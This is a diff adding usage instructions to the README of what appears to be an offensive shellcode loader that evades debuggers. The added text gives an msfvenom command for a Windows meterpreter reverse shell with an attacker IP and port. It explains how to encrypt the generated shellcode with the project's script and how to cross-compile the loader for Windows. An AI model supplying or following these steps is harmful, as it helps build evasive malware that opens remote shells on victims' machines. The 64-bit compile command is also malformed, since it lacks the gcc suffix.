@@ -49,3 +49,14 @@ To try bypass the Debuggers, I'm using the "IsDebuggerPresent()" of "Windows.h" 
 
 - ## :radioactive: Generating the Shellcode
 ![Generating](/assets/generating%20shellcode.gif)
+
+To generate the shellcode type in the terminal: ``` msfvenom -p windows/meterpreter/reverse_shell lhost=(IP) lport=(PORT) -f c ```, copy the shellcode generated and encrypt it.                                                                                                 
+
+To encrypt shellcode use the encrypt_shellcode script.                                                                                   
+On linux type: ``` ./encrypt_shellcode e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)"" ```                                      
+On windows type: ``` encrypt_shellcode.exe e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)"" ```
+
+
+- ## :computer: How to compile for Windows on Linux
+
+To compile for Windows on Linux, first, install mingw-w64: ``` sudo apt-get install mingw-w64 ```, then, to compile for 32 bits: ``` i686-w64-mingw32-gcc -o main.exe main.c -l psapi -static ```, and to 64 bits: ``` x86_64-w64-mingw32 -o main.exe main.c -l psapi -static ```
